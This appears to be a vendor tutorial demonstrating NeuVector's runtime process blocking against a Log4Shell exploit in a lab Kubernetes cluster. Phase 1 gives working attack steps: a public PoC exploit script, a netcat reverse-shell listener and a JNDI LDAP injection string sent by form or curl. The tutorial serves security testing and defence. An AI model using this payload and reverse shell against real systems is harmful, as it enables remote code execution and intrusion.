# Use Case 4: Zero-Day Attack Prevention (Runtime Security)

## Overview
Pre-deployment supply chain scanning is critical, but it cannot stop zero-day exploits—vulnerabilities that have no known CVE signature yet, such as the initial Log4Shell outbreak. 

To mitigate this, NeuVector utilises a patented Zero-Trust Container Runtime. By observing a container's baseline behaviour during regular operation, NeuVector builds a strict "Process Profile". If an attacker exploits a zero-day vulnerability to spawn an anomalous process (like a reverse shell), NeuVector intercepts and terminates the process at the kernel level, regardless of whether a CVE signature exists.

**Business Value:** Provides deterministic, signature-less protection against unknown zero-day attacks and remote code execution (RCE), ensuring applications remain secure even if an underlying library is compromised.

**Threat Vector:** A zero-day Remote Code Execution (RCE) vulnerability (CVE-2021-44228 / Log4Shell) allowing an attacker to inject an LDAP payload, execute arbitrary code, and open a reverse shell into the container.

**Success Criteria:** In `Protect` mode, NeuVector's process enforcement immediately blocks the anomalous `/bin/sh` process spawned by the Java application, preventing the attacker from establishing a reverse shell connection.

---

## Prerequisites for this Test
* A terminal with `netcat` (`nc`), `python3`, `pip`, and `docker` installed.
* A web browser to interact with the vulnerable application's GUI.
* Ensure you map `log4shell.demo.com` to your Kubernetes Ingress IP in your local `/etc/hosts` file.
* Reference PoC Exploit Repository: [kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)

---

## Verification Steps (Interactive Tutorial)

### Phase 1: The Exploit (Simulating an Unprotected Cluster)
First, we will demonstrate the devastating impact of the exploit without runtime protection.

1. **Deploy the vulnerable application** to your cluster from this directory:
```bash
   kubectl apply -f log4shell-vulnerable-app.yaml
   ```
2. Open the NeuVector UI, navigate to **Policy -> Groups**, and search for `nv.log4shell.log4shell-rogue-ns`. Ensure this group is in **Discover** or **Monitor** mode (which allows anomalous processes to run so we can baseline them).
3. **Clone the PoC repository and configure the Python environment:**
```bash
   git clone [https://github.com/kozmer/log4j-shell-poc.git](https://github.com/kozmer/log4j-shell-poc.git)
   cd log4j-shell-poc

   # Create and activate a dedicated Python virtual environment
   python3 -m venv venv
   source venv/bin/activate
   
   # Install the required dependencies (like colorama)
   pip install -r requirements.txt
   ```
4. **Configure the Legacy Java JDK:**
   The exploit script requires an older version of Java to compile the malicious payload.
   * Download the Java JDK archive: `jdk-8u20-linux-x64.tar.gz` (Available via Oracle archives or mirrors).
   * Extract it directly into the root of the `log4j-shell-poc` directory:
```bash
     tar -xf jdk-8u20-linux-x64.tar.gz
     ```
   * **Crucial Step:** Ensure the extracted folder is named exactly `jdk1.8.0_20`. The Python script is hardcoded to look for `./jdk1.8.0_20/bin/java`.
5. **Start your Netcat listener** in a *new* terminal window:
```bash
   nc -lvnp 9001
   ```
6. **Start the Malicious LDAP Server** in your main terminal (ensure your `venv` is still active). Replace `<YOUR_LOCAL_IP>` with your machine's actual IP address:
```bash
   python3 poc.py --userip <YOUR_LOCAL_IP> --webport 8000 --lport 9001
   ```
7. **Fire the payload (GUI Method):**
   * Open your web browser and navigate to `http://log4shell.demo.com` (or the specific port if not using standard port 80 for ingress).
   * You will see the login screen for the vulnerable web application.
   * In the **Username** field, inject the malicious JNDI string provided by the Python output. It will look like this: 
     `${jndi:ldap://<YOUR_LOCAL_IP>:1389/a}`
   * Enter any random text in the Password field and click **Login**.

   *(Optional CLI Method): If you prefer the terminal, you can inject the payload via curl instead:*
```bash
   curl -H 'X-Api-Version: ${jndi:ldap://<YOUR_LOCAL_IP>:1389/a}' [http://log4shell.demo.com:8080/login](http://log4shell.demo.com:8080/login)
   ```
8. **Observe the Compromise:** Look at your Netcat terminal. You will see a successful connection from the Kubernetes pod. You now have a root reverse shell inside the container and can run commands like `whoami` and `ls`.

---

### Phase 2: NeuVector Zero-Trust Runtime Protection
Now, we will stop the zero-day attack purely through behavioural enforcement.

1. Terminate your Netcat session (`Ctrl+C`) and restart the listener: 
```bash
   nc -lvnp 9001
   ```
2. Delete and recreate the vulnerable pod to reset its state: 
```bash
   kubectl delete pod -l app=log4shell -n log4shell-rogue-ns
   ```
3. Open the NeuVector UI, navigate to **Policy -> Groups**, and search for `nv.log4shell.log4shell-rogue-ns`.
4. Click on the group, and change the mode toggle from Discover/Monitor to **Protect**.
   * *Note: In Protect mode, NeuVector locks the container. Only processes explicitly listed in the "Process Profile Rules" tab (like `java`) are allowed to execute.*
5. **Fire the payload again:** Return to your web browser, refresh the login page, and submit the exact same JNDI string `${jndi:ldap://<YOUR_LOCAL_IP>:1389/a}` into the Username field (or run the optional `curl` command).
6. **Observe the Defence:** Look at your Netcat terminal. **It is empty.** The connection never arrives.
7. Open the NeuVector UI and navigate to **Notifications -> Security Events**.
8. You will see a high-severity **Process Profile Violation** (Deny). NeuVector detected that the trusted `java` process suddenly attempted to execute a bash/shell binary. Because this behaviour deviates from the baseline profile, NeuVector's runtime engine instantly terminated the anomalous execution, completely neutralising the zero-day exploit!
````</YOUR_LOCAL_IP></YOUR_LOCAL_IP>